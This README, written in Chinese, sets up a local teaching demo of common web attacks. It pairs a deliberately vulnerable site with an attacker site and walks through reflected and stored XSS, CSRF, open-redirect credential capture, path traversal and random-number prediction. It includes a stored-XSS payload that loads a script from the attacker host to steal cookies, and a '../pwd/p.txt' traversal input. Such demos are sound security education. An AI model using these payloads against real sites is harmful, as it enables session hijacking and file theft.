# websecuredemo
web 应用常见攻击演示demo


1. 本地需要安装一个mysql, 新建一个mytest库, 没有密码
2. 启动bug与attack, 在mytest库的user表里增加一个"1	admin	admin	admin"用户
3. 绑定bug.local到127.0.0.1  |  ata.local 到127.0.0.1
4. 访问 http://ata.local:8081/ 可以看到攻击实例
5. 点击图片测试反射型脚本攻击
6. 登录 http://bug.local:8080/ 测试存储型跨站脚本 新增用户或者修改昵称为 "tc<script type="text/javascript" src="http://ata.local:8081/js/a.js" ></script>", 可以看到数据库中收到了当前用户的cookie, 用另一个用户登录修改cookie更换身份
7. 在bug站登录后, 在ata站点上点击csrf攻击, 看到当前bug站用户昵称被修改
8. 在bug站处于未登录状态, 在ata站点点击url redirect攻击, 看到用户两次输入账号密码, 数据库中csrfuser存有用户数据
9. 文件下载攻击, 在本地e:/test/img/ 下放置一张图片, http://bug.local:8080/download?filename=a.jpg 演示图片下载成功, 在e:/test/pwd/下放置一个txt文件, 演示http://bug.local:8080/download?filename=../pwd/p.txt 窃取成功
10. 密码算法安全, 打开源代码org.hmzb.random.RandomCracker 直接运行main, 演示随机数预测.